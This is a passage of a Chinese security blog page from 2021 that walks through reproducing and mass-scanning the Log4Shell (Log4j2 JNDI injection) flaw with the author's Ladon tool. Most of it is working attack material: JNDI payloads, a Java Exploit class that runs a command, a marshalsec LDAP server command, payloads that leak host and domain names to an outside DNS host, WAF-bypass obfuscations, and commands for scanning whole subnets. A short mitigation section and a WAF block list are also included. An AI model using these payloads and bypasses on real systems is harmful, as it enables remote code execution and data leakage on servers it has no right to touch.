@@ -1,0 +1,449 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="K8哥哥’s Blog">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.0.0">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="http://k8gege.org">
+    <!--SEO-->
+
+<meta name="keywords" content="Log4j2">
+
+
+<meta name="description" content="
+漏洞简介
+Apache Log4j2是一款优秀的Java日志框架。近日，漏洞银行安全团队注意到了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功...">
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+    <!--Title-->
+
+<title>
+    
+    〖工具〗log4Shell核弹级漏洞复现&amp;Ladon批量检测 |
+    
+    K8哥哥’s Blog
+</title>
+
+<link rel="alternate" href="/atom.xml" title="K8哥哥’s Blog" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+
+
+
+    
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header" style="background-image:url(
+    https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title="K8gege">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+			<h3 class="K8tilte">K8哥哥</h3>
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">没有绝对安全的系统</h2>-->
+            
+            <h2>
+                没有绝对安全的系统
+            </h2>
+            
+        </div>
+    </div>
+	
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="http://k8gege.org">
+                        K8哥哥’s Blog</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                Home</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/Ladon/"><i class="fa "></i>
+                                Ladon</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Code/"><i class="fa "></i>
+                                Code</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Exp/"><i class="fa "></i>
+                                Exp</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Tool/"><i class="fa "></i>
+                                Tool</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                Archives</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/friends/"><i class="fa "></i>
+                                Friends</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/atom.xml"><i class="fa "></i>
+                                Rss</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="〖工具〗log4Shell核弹级漏洞复现&amp;Ladon批量检测">
+            
+            〖工具〗log4Shell核弹级漏洞复现&amp;Ladon批量检测
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/exp/">exp</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-none-link" href="/tags/Log4j2/" rel="tag">Log4j2</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2021/12/16</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+        <p class="fa fa-exclamation-triangle warning">
+            本文于<strong>
+                1219</strong>
+            天之前发表
+        </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p><img alt="使用http访问查看图片" data-original="/k8img/posts/log4j/log4shell_1.PNG"></p>
+<h3 id="漏洞简介">漏洞简介</h3>
+<p>Apache Log4j2是一款优秀的Java日志框架。近日，漏洞银行安全团队注意到了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。</p>
+<h3 id="漏洞原理">漏洞原理</h3>
+<p>Apache Log4j2 中存在JNDI注入漏洞，当程序将用户输入的数据进行日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。</p>
+<h3 id="影响版本">影响版本</h3>
+<p>Apache Log4j 2.0 &lt;= 2.15.0-rc1</p>
+<h3 id="影响产品">影响产品</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Apache Struts</span><br><span class="line">Apache Struts 2</span><br><span class="line">Apache Solr</span><br><span class="line">Apache Druid</span><br><span class="line">Apache Flink</span><br><span class="line">Apache Spark</span><br><span class="line">Apache Tomcat</span><br><span class="line">ElasticSearch</span><br><span class="line">Flume</span><br><span class="line">Apache Dubbo</span><br><span class="line">Logstash</span><br><span class="line">Kafka</span><br><span class="line">Spring-Boot-starter-log4j2</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">RedHat     Not all RedHat packages are vulnerable, but some of the Openshift and JBoss packages are affected.     https://access.redhat.com/security/cve/cve-2021-4</span><br><span class="line"></span><br><span class="line">Jenkins     Although Jenkins Core is not affected by default, plug-ins installed <span class="keyword">in</span> Jenkins can use the vulnerable version of Log4J. There is also a method to verify <span class="keyword">if</span> any of the plug-ins installed uses Log4j. The second <span class="built_in">link</span> contains a list of the vulnerable versions of the plug-in that have been found as of this writing.     </span><br><span class="line"></span><br><span class="line">https://www.jenkins.io/blog/2021/12/10/log4j2-rce-CVE-2021-44228/</span><br><span class="line"></span><br><span class="line">https://issues.jenkins.io/browse/JENKINS-67353?focusedCommentId=416946&amp;page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-416946</span><br><span class="line"></span><br><span class="line">Apache Solr     Apache Solr releases prior to 7.4 are affected.     https://solr.apache.org/security.html#apache-solr-affected-by-apache-log4j-cve-2021-44228</span><br><span class="line"></span><br><span class="line">VMWare     Multiple products are affected.     https://www.vmware.com/security/advisories/VMSA-2021-0028.html</span><br><span class="line"></span><br><span class="line">Citrix     Investigation pending     https://support.citrix.com/article/CTX335705</span><br><span class="line"></span><br><span class="line">Atlassian     Atlassian is vulnerable <span class="keyword">if</span> the default configuration was modified.     https://confluence.atlassian.com/kb/faq-for-cve-2021-44228-1103069406.html</span><br><span class="line"></span><br><span class="line">NetApp     Multiple NetApp products are vulnerable.     https://security.netapp.com/advisory/ntap-20211210-0007/</span><br></pre></td></tr></tbody></table></figure>
+<p>PS: 除了本文列的这些产品，还有很多产品受到影响，具体可Google搜漏洞编号加产品名称，若是官方公告注明哪些版本修复漏洞或哪些版本测试存在漏洞，就代表该产品受到影响，不用你一个个搭环境测试，先不说搭各种环境费时间，就算搭好了触发点在哪，你也得测好长时间，所以要善用搜索引擎。</p>
+<h3 id="漏洞环境1">漏洞环境1</h3>
+<p>使用IDEA新建项目，漏洞示例代码如下</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.logging.log4j.LogManager;</span><br><span class="line">import org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line">public class log4j {</span><br><span class="line">    private static final Logger logger = LogManager.getLogger(log4j.class);</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) {</span><br><span class="line">        //logger.error(<span class="string">"<span class="variable">${jndi:ldap://192.168.250.83:800/calc}</span>"</span>);</span><br><span class="line">        logger.error(<span class="string">"<span class="variable">${jndi:rmi://192.168.250.83:800/calc}</span>"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="漏洞复现1">漏洞复现1</h3>
+<p>启用Ladon的web监听，编译执行Poc项目，可看到Ladon回显目标IP以及提交的数据，Ldap出现一些特殊符号，最明显的是几个笑脸，Rmi回显前几个字符串为JRMI，回显以下特征说明目标存在jdni注入漏洞。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon web 800</span><br></pre></td></tr></tbody></table></figure>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/log4j/log4shell_2.PNG"></p>
+<p>其实也不是非要jndi来远程测试漏洞，log4j也支持java获取信息环境变量等，本地APP需要测试还好，实战是盲测，不像本地可以后台看，实战你只能外带，所以才用到jndi协议，有些人问为什么不用其它协议，因为受漏洞限制只能jndi协议，利用你就得看jndi支持什么协议，你才能利用什么协议。如以下代码，编译项目执行，会输出版本和操作系统信息。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger.error(<span class="string">"<span class="variable">${java:version}</span>/<span class="variable">${java:os}</span>"</span>);</span><br></pre></td></tr></tbody></table></figure>
+<p>也可使用以下协议探测</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">${jndi:ldap:/}</span></span><br><span class="line"><span class="variable">${jndi:ldaps:/}</span></span><br><span class="line"><span class="variable">${jndi:rmi:/}</span></span><br><span class="line"><span class="variable">${jndi:dns:/}</span></span><br><span class="line"><span class="variable">${jndi:iiop:/}</span></span><br></pre></td></tr></tbody></table></figure>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/log4j/log4shell_3.PNG"></p>
+<h3 id="漏洞环境2">漏洞环境2</h3>
+<p>使用docker搭建环境，这样可模拟从内网另一台机来攻击该机器</p>
+<p>docker pull vulfocus/log4j2-rce-2021-12-09:latest</p>
+<h3 id="启动环境2">启动环境2</h3>
+<p>docker run -d -P vulfocus/log4j2-rce-2021-12-09:latest</p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/log4j/log4shell_4.PNG"></p>
+<h3 id="漏洞复现2">漏洞复现2</h3>
+<p>由于不知道漏洞触发点，使用LadonExp.exe盲测，发现注入点为Accept参数,测试方法所有参数均填写payload，目标URL填写需要测试的站点，点击Build_Exe，然后点击Test_exe测试即可。</p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/log4j/log4shell_5.PNG"></p>
+<p>改成rmi协议时，发现无法触发，于是看了下环境的JDK版本，发现是292的，JDK1.8 191起默认不支持RMI协议，所以用rmi测试失败。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@4e4424eccb8d:/demo# java -version</span><br><span class="line">openjdk version <span class="string">"1.8.0_292"</span></span><br><span class="line">OpenJDK Runtime Environment (build 1.8.0_292-8u292-b10-0ubuntu1~18.04-b10)</span><br><span class="line">OpenJDK 64-Bit Server VM (build 25.292-b10, mixed mode)</span><br></pre></td></tr></tbody></table></figure>
+<h5 id="以下协议自行测试">以下协议自行测试</h5>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">${date:ldap://</span></span><br><span class="line"><span class="variable"><span class="variable">${java:ldap://</span></span></span><br><span class="line"><span class="variable"><span class="variable"><span class="variable">${marker:ldap://</span></span></span></span><br><span class="line"><span class="variable"><span class="variable"><span class="variable"><span class="variable">${ctx:ldap://</span></span></span></span></span><br><span class="line"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable">${lower:ldap://</span></span></span></span></span></span><br><span class="line"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable">${upper:ldap://</span></span></span></span></span></span></span><br><span class="line"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable">${jndi:ldap://</span></span></span></span></span></span></span></span><br><span class="line"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable">${jndi:rmi://</span></span></span></span></span></span></span></span></span><br><span class="line"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable">${main:ldap://</span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable">${jvmrunargs:ldap://</span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable">${sys:ldap://</span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable">${env:ldap://</span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable">${log4j:ldap://</span></span></span></span></span></span></span></span></span></span></span></span></span></span><br></pre></td></tr></tbody></table></figure>
+<h4 id="批量检测C段">批量检测C段</h4>
+<p>将LadonExp生成的exe改名为log4poc.exe，使用以下命令即可批量检测C段站点是否存在log4j的jndi注入漏洞。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.1/c log4poc.exe</span><br></pre></td></tr></tbody></table></figure>
+<h4 id="批量检测url-txt">批量检测url.txt</h4>
+<p>提供你已找好使用JAVA开发的站点URL，存放于url.txt，使用以下命令检测</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon url.txt log4poc.exe</span><br></pre></td></tr></tbody></table></figure>
+<p>PS: 有人说Ladon为什么不提供log4j漏洞检测，实际上早提供了，之前我不是发过好几篇使用LadonExp一键生成漏洞Poc的演示文章吗？不需要懂编程，只要懂漏洞原理，抓别人的包，填写对应参数，就可快速实战批量使用新的POC，这技能你们都不学，错过了最佳时期别怪我啊…</p>
+<h3 id="Exploit">Exploit</h3>
+<p>使用JAVA编译exp.java生成我们的反序列化类Exploit.class，放在Ladon目录下，使用Ladon web 800一键开启渗透专用迷你web服务器。演示代码为弹出计算器，实战自行修改代码实现任意功能，不只是执行CMD。要知道所谓CMD命令也是由各编程语言的代码编译成EXE后才是你所使用的命令，代码执行可做CMD做不了的很多事，这是代码执行和命令执行的最大区别。本漏洞主要是受限于触发的jndi协议限制，不能本地内部执行代码或命令，需远程加载，实际上也能执行些简短代码的,如漏洞环境1</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//javac exp.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span> {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> {</span><br><span class="line"></span><br><span class="line">        System.err.println(<span class="string">"k8gege"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line"></span><br><span class="line">            String test= <span class="string">"calc"</span>;</span><br><span class="line"></span><br><span class="line">            Runtime.getRuntime().exec(test);</span><br><span class="line"></span><br><span class="line">        } <span class="keyword">catch</span> ( Exception e ) {</span><br><span class="line"></span><br><span class="line">            e.printStackTrace();</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="启动Ladp服务器">启动Ladp服务器</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">"http://192.168.250.83:800/#Exploit"</span></span><br></pre></td></tr></tbody></table></figure>
+<p>将漏洞复现1的POC代码修改，指向我们的ldap服务器，编译执行弹出calc</p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/log4j/log4shell.gif"></p>
+<h3 id="Payload">Payload</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">${jndi:ldap://<span class="variable">${hostName}</span>.log4shell.k8gege.org}</span></span><br><span class="line"><span class="variable">${jndi:rmi://<span class="variable">${hostName}</span>.log4shell.k8gege.org}</span></span><br></pre></td></tr></tbody></table></figure>
+<h3 id="Ladon监听">Ladon监听</h3>
+<p>${jndi:ldap://192.168.1.8:800/test}<br>
+${jndi:rmi://192.168.1.8:800/test}</p>
+<h3 id="DNS协议">DNS协议</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">${jndi:dns://<span class="variable">${hostName}</span>.log4shell.k8gege.org}</span></span><br><span class="line"><span class="variable">${jndi:dns://<span class="variable">${env:COMPUTERNAME}</span>.log4shell.k8gege.org}</span></span><br><span class="line"><span class="variable">${jndi:dns://<span class="variable">${env:USERDOMAIN}</span>.log4shell.k8gege.org}</span></span><br></pre></td></tr></tbody></table></figure>
+<h3 id="WAF拦截规则">WAF拦截规则</h3>
+<p>应急时可能WAF使用以下特征拦截，很明显治标不治本，只能暂时缓解</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">${date:ldap://</span></span><br><span class="line"><span class="variable"><span class="variable">${java:ldap://</span></span></span><br><span class="line"><span class="variable"><span class="variable"><span class="variable">${marker:ldap://</span></span></span></span><br><span class="line"><span class="variable"><span class="variable"><span class="variable"><span class="variable">${ctx:ldap://</span></span></span></span></span><br><span class="line"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable">${lower:ldap://</span></span></span></span></span></span><br><span class="line"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable">${upper:ldap://</span></span></span></span></span></span></span><br><span class="line"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable">${jndi:ldap://</span></span></span></span></span></span></span></span><br><span class="line"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable">${jndi:rmi://</span></span></span></span></span></span></span></span></span><br><span class="line"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable">${main:ldap://</span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable">${jvmrunargs:ldap://</span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable">${sys:ldap://</span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable">${env:ldap://</span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable"><span class="variable">${log4j:ldap://</span></span></span></span></span></span></span></span></span></span></span></span></span></span><br></pre></td></tr></tbody></table></figure>
+<h3 id="Bypass-RC1">Bypass RC1</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">${jndi:ldap://127.0.0.1:1389/ badClassName}</span></span><br></pre></td></tr></tbody></table></figure>
+<h3 id="Bypass-WAF">Bypass WAF</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">${<span class="variable">${::-j}</span><span class="variable">${::-n}</span><span class="variable">${::-d}</span><span class="variable">${::-i}</span>:<span class="variable">${::-r}</span><span class="variable">${::-m}</span><span class="variable">${::-i}</span>://k123.k123.k123/poc}</span></span><br><span class="line"><span class="variable">${<span class="variable">${::-j}</span>ndi:rmi://k123.k123.k123/ass}</span></span><br><span class="line"><span class="variable">${jndi:rmi://k8.k123.k123}</span></span><br><span class="line"><span class="variable">${<span class="variable">${lower:jndi}</span>:<span class="variable">${lower:rmi}</span>://k8.k123.k123/poc}</span></span><br><span class="line"><span class="variable">${<span class="variable">${lower:<span class="variable">${lower:jndi}</span>}</span>:<span class="variable">${lower:rmi}</span>://k8.k123.k123/poc}</span></span><br><span class="line"><span class="variable">${<span class="variable">${lower:j}</span><span class="variable">${lower:n}</span><span class="variable">${lower:d}</span>i:<span class="variable">${lower:rmi}</span>://k8.k123.k123/poc}</span></span><br></pre></td></tr></tbody></table></figure>
+<h3 id="该漏洞利用条件">该漏洞利用条件</h3>
+<pre><code>Log4j2版本Log4j 2.0 &lt;= 2.15.0-rc1，并非有调用log4j就有洞
+
+JDK版本限制，jdk8u191之后RMI和LDAP默认不能从远程加载类
+
+可能产生日志记录的地方，用户登陆日志记录啊，UserAgent、Cookie等，谁知道网站开发者想记录用户什么数据？不确定的情况下，盲测但凡有参数的地方，我们都可以尝试，或许有惊喜。
+
+目标允许出网，不能出网，存在洞你也不知道，除非你已进入内网，通过Ladon在内网监听，测试内网站点是否存在jndi漏洞。假设机器只允许dns出网，使用Dnslog探测存在漏洞，TCP协议出不了，ldap、rmi等无法加载class，你也拿不了shell啊，存在洞和能拿权限是两回事。
+</code></pre>
+<p>PS: 该漏洞说大影响大嘛也是真的非常大，但说它鸡肋也鸡肋，因为我的目标就没一个成功的，或许存在洞的机器早已通过其它洞拿下，</p>
+<h3 id="有些人问为什么不用dnslog？">有些人问为什么不用dnslog？</h3>
+<p>你喜欢用dnslog的话也可以，没什么问题，只是这几天这洞玩的人太多，dnslog经常卡死，无法使用，这是第一个原因。其次使用dnslog，意味着我们的目标或者说正在测试只有内部人知道公司某些服务器使用log4j，若是别人也随机到和你相同的域名，你们公司存在漏洞的站点IP泄露出去，会是什么后果？使用自己的VPS来搭建的接收器才是最安全的，当然ldap或rmi协议出不来的话，就只能用dnslog来接收dns协议，因为Ladon无法监听DNS协议，当然要是你要时间也可以完全自己搭个DNS服务器还接收。</p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/log4j/log4shell_6.PNG"></p>
+<h3 id="为什么Ladon能监听LDAP、RMI？">为什么Ladon能监听LDAP、RMI？</h3>
+<p>为什么ldap、rmi、http等协议Ladon可以监听到，因为它们本身就是特殊的tcp协议，所以Ladon当然能捕获到。初中有没学过正方形是特殊的长方形，就是说你把正方形说成长方形也没错，Ladon虽然主要只是解析HTTP协议，但也没完全对其它协议进行丢弃，只要对前面部份数据16进制原样解析还是会看到一些明显的字眼如JRMI协议，所以Ladon对于一些非HTTP协议也可以从控制台看出来，同理以后其它无回显漏洞也可以使用Ladon监听，之前我也发过3篇文章，Linux无回显渗透、Java无回显渗透、PowerShell等，大家一定要学会举一反三，不要非要等别人告诉你，你才知道在这种场景也能用。</p>
+<h3 id="漏洞修复">漏洞修复</h3>
+<h4 id="方案一">方案一</h4>
+<p>更新至官方修复版本</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a></p>
+<h4 id="方案二">方案二</h4>
+<p>①在jvm启动参数中添加</p>
+<p>Dlog4j2.formatMsgNoLookups=true<br>
+②系统环境变量中配置FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS=true<br>
+③项目中创建log4j2.component.properties文件，文件中增加配置log4j2.formatMsgNoLookups=true</p>
+<h3 id="Log4j-JAVA">Log4j-JAVA</h3>
+<h4 id="系统信息">系统信息</h4>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ID     usage     method</span><br><span class="line">1     <span class="variable">${java:version}</span>     getSystemProperty(<span class="string">"java.version"</span>)</span><br><span class="line">2     <span class="variable">${java:runtime}</span>     getRuntime()</span><br><span class="line">3     <span class="variable">${java:vm}</span>     getVirtualMachine()</span><br><span class="line">4     <span class="variable">${java:os}</span>     getOperatingSystem()</span><br><span class="line">5     <span class="variable">${java:hw}</span>     getHardware()</span><br><span class="line">6     <span class="variable">${java:locale}</span>     getLocale()</span><br></pre></td></tr></tbody></table></figure>
+<h4 id="环境变量">环境变量</h4>
